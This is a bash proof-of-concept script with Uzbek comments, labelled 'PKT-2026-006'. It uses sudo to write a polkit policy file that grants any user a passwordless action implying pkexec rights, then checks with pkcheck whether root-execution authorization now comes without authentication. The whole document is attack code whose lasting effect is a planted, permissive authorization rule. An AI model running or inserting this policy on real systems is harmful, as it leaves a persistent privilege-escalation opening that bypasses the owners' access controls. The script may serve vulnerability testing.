#!/bin/bash

# Ranglar
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

POLICY_FILE="/usr/share/polkit-1/actions/org.zdi.exploit.policy"

echo "[*] PKT-2026-006 uchun Real PoC tayyorlanmoqda..."

# 1. Policy faylini yaratish (SUDO kerak bo'ladi)
sudo bash -c "cat <<EOF > $POLICY_FILE
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE policyconfig PUBLIC \"-//freedesktop//DTD PolicyKit Policy Configuration 1.0//EN\"
 \"http://www.freedesktop.org/standards/PolicyKit/1/policyconfig.dtd\">
<policyconfig>
  <action id=\"org.zdi.exploit\">
    <description>ZDI Exploit Action</description>
    <message>Authentication is NOT required</message>
    <defaults>
      <allow_any>yes</allow_any>
      <allow_inactive>yes</allow_inactive>
      <allow_active>yes</allow_active>
    </defaults>
    <annotate key=\"org.freedesktop.policykit.imply\">org.freedesktop.policykit.exec</annotate>
  </action>
</policyconfig>
EOF"

if [ $? -ne 0 ]; then
    echo -e "${RED}[!] XATO: Policy faylini yozib bo'lmadi. Sudo parolini to'g'ri kiriting.${NC}"
    exit 1
fi

echo "[*] Policy fayli o'rnatildi. Polkit keshini yangilash kutilmoqda..."
sleep 2 # Polkit faylni o'qib olishi uchun vaqt beramiz

# 2. Zaiflikni isbotlash
echo "[*] 'org.freedesktop.policykit.exec' (pkexec) uchun ruxsat tekshirilmoqda..."

# pkcheck orqali tekshirish. --allow-user-interaction ishlatmaymiz
# Agar zaiflik bo'lsa, parolsiz 'yes' qaytishi kerak
RESULT=$(pkcheck --action-id org.freedesktop.policykit.exec --process $$ 2>&1)
EXIT_CODE=$?

if [ $EXIT_CODE -eq 0 ]; then
    echo -e "${GREEN}[+++] SUCCESS: PKT-2026-006 tasdiqlandi!${NC}"
    echo -e "${GREEN}[+] Oddiy foydalanuvchi pkexec huquqini (imply orqali) qo'lga kiritdi.${NC}"
else
    echo -e "${RED}[- ] FAILED: Polkit hali ham parol so'rayapti yoki ruxsat bermadi.${NC}"
    echo "Natija: $RESULT"
fi

